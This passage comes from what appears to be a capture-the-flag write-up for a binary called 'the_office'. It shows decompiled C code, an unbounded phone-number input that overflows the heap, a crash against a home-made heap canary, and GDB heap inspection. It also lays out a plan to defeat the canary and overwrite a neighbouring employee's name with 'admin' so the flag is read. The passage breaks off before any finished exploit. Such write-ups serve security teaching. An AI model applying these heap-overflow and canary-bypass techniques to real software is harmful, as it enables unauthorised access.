<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">void</span> <span class=mtk8>get_access_token</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class="mtk9 mtki">param_1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class=mtk1>FILE</span> <span class=mtk5>*</span><span class=mtk1>__stream;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>pcVar2;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>in_GS_OFFSET;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>local_90[</span><span class=mtk6>128</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_10;</span>

  <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>) (in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>strncmp</span><span class=mtk1>(param_1,</span> <span class=mtk4>"admin"</span><span class=mtk1>,</span> <span class=mtk6>6</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Not</span> <span class=mtk4>admin"</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>(local_10</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>))</span> <span class=mtk1>{</span>
      <span class=mtk8>FUN_08049bd0</span><span class=mtk1>();</span>
    <span class=mtk1>}</span>
    <span class=mtk5>return</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk1>__stream</span> <span class=mtk5>=</span> <span class=mtk8>fopen</span><span class=mtk1>(</span><span class=mtk4>"flag.txt"</span><span class=mtk1>,</span> <span class=mtk4>"r"</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(__stream</span> <span class=mtk5>==</span> <span class=mtk1>(FILE</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Unable</span> <span class=mtk4>to</span> <span class=mtk4>open</span> <span class=mtk4>flag!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>  
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>pcVar2</span> <span class=mtk5>=</span> <span class=mtk8>fgets</span><span class=mtk1>(local_90,</span> <span class=mtk5>0x</span><span class=mtk6>7f</span><span class=mtk1>,</span> <span class=mtk1>__stream);</span>
  <span class=mtk5>if</span> <span class=mtk1>(pcVar2</span> <span class=mtk5>!=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(local_90);</span>
    <span class=mtk8>fclose</span><span class=mtk1>(__stream);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk6>0</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Unable</span> <span class=mtk4>to</span> <span class=mtk4>read</span> <span class=mtk4>flag!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
  <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>As we can see, if the username for an employee is <code>admin</code>, we can read the flag. This is the function to add an employee:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">char</span> <span class=mtk5>*</span> <span class=mtk8>add_employee</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>iVar1;</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>uVar2;</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>in_GS_OFFSET;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>local_9d;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>local_9c;</span>
  <span class="mtk7 mtki">size_t</span> <span class=mtk1>local_98;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>local_94;</span>
  <span class="mtk7 mtki">char</span> <span class=mtk1>local_90[</span><span class=mtk6>128</span><span class=mtk1>];</span>
  <span class="mtk7 mtki">int</span> <span class=mtk1>local_10;</span>

  <span class=mtk1>local_10</span> <span class=mtk5>=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>);</span>
  <span class=mtk1>local_9c</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>FUN_080494be</span><span class=mtk1>(</span><span class=mtk5>0x</span><span class=mtk6>28</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(local_9c</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Ran</span> <span class=mtk4>out</span> <span class=mtk4>of</span> <span class=mtk4>memory!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk1>local_9d</span> <span class=mtk5>=</span> <span class=mtk4>'</span><span class=mtk6>\0</span><span class=mtk4>'</span><span class=mtk1>;</span>
  <span class=mtk1>local_98</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Name:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%15s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_9c);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk1>L</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>strncmp</span><span class=mtk1>(local_9c,</span> <span class=mtk4>"admin"</span><span class=mtk1>,</span> <span class=mtk6>6</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Cannot</span> <span class=mtk4>be</span> <span class=mtk4>admin!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Email</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%c</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_9d);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk1>L</span><span class=mtk4>'</span><span class=mtk6>\n</span><span class=mtk4>'</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>((local_9d</span> <span class=mtk5>==</span> <span class=mtk4>'n'</span><span class=mtk1>)</span> <span class=mtk5>||</span> <span class=mtk1>(local_9d</span> <span class=mtk5>==</span> <span class=mtk4>'N'</span><span class=mtk1>))</span> <span class=mtk1>{</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)(local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>
  <span class=mtk1>}</span>
  <span class=mtk5>else</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Email</span> <span class=mtk4>address:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%127s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_90);</span>
    <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
      <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
    <span class=mtk5>do</span> <span class=mtk1>{</span>
      <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
      <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk1>local_98</span> <span class=mtk5>=</span> <span class=mtk8>strnlen</span><span class=mtk1>(local_90,</span> <span class=mtk5>0x</span><span class=mtk6>7f</span><span class=mtk1>);</span>
    <span class=mtk1>uVar2</span> <span class=mtk5>=</span> <span class=mtk8>FUN_080494be</span><span class=mtk1>(local_98</span> <span class=mtk5>+</span> <span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined4</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>=</span> <span class=mtk1>uVar2;</span>
    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
      <span class=mtk8>puts</span><span class=mtk1>(</span><span class=mtk4>"Ran</span> <span class=mtk4>out</span> <span class=mtk4>of</span> <span class=mtk4>memory!"</span><span class=mtk1>);</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
      <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
    <span class=mtk8>strncpy</span><span class=mtk1>(</span><span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>**</span><span class=mtk1>)</span> <span class=mtk1>(local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>),</span> <span class=mtk1>local_90,</span> <span class=mtk1>local_98);</span>
    <span class=mtk5>*</span><span class=mtk1>(undefined</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_98</span> <span class=mtk5>+</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>10</span><span class=mtk1>))</span> <span class=mtk5>=</span> <span class=mtk6>0</span><span class=mtk1>;</span>  
  <span class=mtk1>}</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Salary:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%u</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Phone</span> <span class=mtk4>#:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Bldg</span> <span class=mtk4>(y/n)?</span> <span class=mtk4>"</span><span class=mtk1>);</span>
  <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%c</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk5>&amp;</span><span class=mtk1>local_9d);</span>
  <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
    <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk5>do</span> <span class=mtk1>{</span>
    <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
    <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
  <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>((local_9d</span> <span class=mtk5>!=</span> <span class=mtk4>'n'</span><span class=mtk1>)</span> <span class=mtk5>&amp;&amp;</span> <span class=mtk1>(local_9d</span> <span class=mtk5>!=</span> <span class=mtk4>'N'</span><span class=mtk1>))</span> <span class=mtk1>{</span>
    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Bldg</span> <span class=mtk4>#:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
    <span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%u</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>24</span><span class=mtk1>);</span>
    <span class=mtk5>if</span> <span class=mtk1>(iVar1</span> <span class=mtk5>!=</span> <span class=mtk6>1</span><span class=mtk1>)</span> <span class=mtk1>{</span>
                    <span class=mtk3>/*</span> <span class=mtk3>WARNING:</span> <span class=mtk3>Subroutine</span> <span class=mtk3>does</span> <span class=mtk3>not</span> <span class=mtk3>return</span> <span class=mtk3>*/</span>
      <span class=mtk8>exit</span><span class=mtk1>(</span><span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
    <span class=mtk1>}</span>
    <span class=mtk5>do</span> <span class=mtk1>{</span>
      <span class=mtk1>_local_94</span> <span class=mtk5>=</span> <span class=mtk8>getchar</span><span class=mtk1>();</span>
      <span class=mtk5>if</span> <span class=mtk1>(_local_94</span> <span class=mtk5>==</span> <span class=mtk6>10</span><span class=mtk1>)</span> <span class=mtk5>break</span><span class=mtk1>;</span>
    <span class=mtk1>}</span> <span class=mtk5>while</span> <span class=mtk1>(_local_94</span> <span class=mtk5>!=</span> <span class=mtk5>-</span><span class=mtk6>1</span><span class=mtk1>);</span>
  <span class=mtk1>}</span>
  <span class=mtk8>putchar</span><span class=mtk1>(</span><span class=mtk6>10</span><span class=mtk1>);</span>
  <span class=mtk5>if</span> <span class=mtk1>(local_10</span> <span class=mtk5>!=</span> <span class=mtk5>*</span><span class=mtk1>(</span><span class="mtk7 mtki">int</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk1>(in_GS_OFFSET</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>14</span><span class=mtk1>))</span> <span class=mtk1>{</span>
    <span class=mtk1>local_9c</span> <span class=mtk5>=</span> <span class=mtk1>(</span><span class="mtk7 mtki">char</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk8>FUN_08049bd0</span><span class=mtk1>();</span>
  <span class=mtk1>}</span>
  <span class=mtk5>return</span> <span class=mtk1>local_9c;</span>
<span class=mtk1>}</span>
</code></pre></div>
<p>In the code, we see that we cannot create an employee using <code>admin</code> as username. Moreover, we observe that <code>Phone #</code> is vulnerable to Buffer Overflow, because it does not limit the length of the string we can enter:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Phone</span> <span class=mtk4>#:</span> <span class=mtk4>"</span><span class=mtk1>);</span>
<span class=mtk1>iVar1</span> <span class=mtk5>=</span> <span class=mtk8>__isoc99_scanf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>local_9c</span> <span class=mtk5>+</span> <span class=mtk5>0x</span><span class=mtk6>18</span><span class=mtk1>);</span>  
</code></pre></div>
<p>We can try to overflow it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>./the_office</span>
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: asdf
Email (y/n)? n
Salary: 1234
Phone #: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Bldg (y/n)? n

*** heap smashing detected ***: ./the_office terminated
</code></pre></div>
<p>There is a canary protecting the heap overflow attacks. Let&rsquo;s use GDB to see how the heap is handled:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q the_office
Reading symbols from <span class=code-dark-green>the_office</span>...
(No debugging symbols found in <span class=code-dark-green>the_office</span>)
<span class=code-red>gef➤</span>  break puts
Breakpoint 1 at <span class=code-dark-blue>0x8048600</span>
<span class=code-red>gef➤</span>  run
Starting program: ./the_office

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  continue
Continuing.
0) Exit
1) Add employee
2) Remove employee
3) List employees
4) Get access token
1
Name: AAAA
Email (y/n)? n
Salary: 255
Phone #: BBBB
Bldg (y/n)? n

Breakpoint 1, <span class=code-dark-blue>0xf7e3e290</span> in <span class=code-dark-yellow>puts</span> () from <span class=code-dark-green>/lib32/libc.so.6</span>  
</code></pre></div>
<p>To search for the heap addresses, we can simply search for <code>AAAA</code>, which is the name of the employee:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  grep AAAA
<span class=code-blue>[+]</span> Searching '<span class=code-dark-yellow>AAAA</span>' in memory
<span class=code-green>[+]</span> In (0xf7ffb000-0xf7ffc000), permission=rw-
  0xf7ffb00c - 0xf7ffb010  →   "<span class=code-dark-magenta>AAAA</span>"
<span class=code-green>gef➤</span>  x/32x 0xf7ffb000
<span class=code-dark-blue>0xf7ffb000</span>:     0x1a3e675e      0x00000035      0x00000001      0x41414141  
<span class=code-dark-blue>0xf7ffb010</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb020</span>:     0x000000ff      0x42424242      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb030</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb040</span>:     0x1a3e675e      0x00000fb4      0x00000035      0x00000000
<span class=code-dark-blue>0xf7ffb050</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb060</span>:     0x00000000      0x00000000      0x00000000      0x00000000
<span class=code-dark-blue>0xf7ffb070</span>:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre></div>
<p>That&rsquo;s it, we have the canary there. To bypass it, we need to leak it or compute it before exploiting the Buffer Overflow vulnerability. Then, we can use the overflow to modify the name of the next employee and rename it as <code>admin</code>.</p>
<p>Since it is a home-made canary, we can see how it is generated. Actually, there is a function inside the binary that prints some debugging information about the heap, but it is disabled. However, we have the decompiled source code:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>undefined4</span> <span class=mtk8>FUN_08049240</span><span class=mtk1>()</span> <span class=mtk1>{</span>
  <span class=mtk1>undefined4</span> <span class=mtk1>uVar1;</span>
  <span class="mtk7 mtki">uint</span> <span class=mtk1>__seed;</span>

  <span class=mtk5>if</span> <span class=mtk1>(DAT_0804c070</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk7 mtki">void</span> <span class=mtk5>*</span><span class=mtk1>)</span> <span class=mtk5>0x</span><span class=mtk6>0</span><span class=mtk1>)</span> <span class=mtk1>{</span>
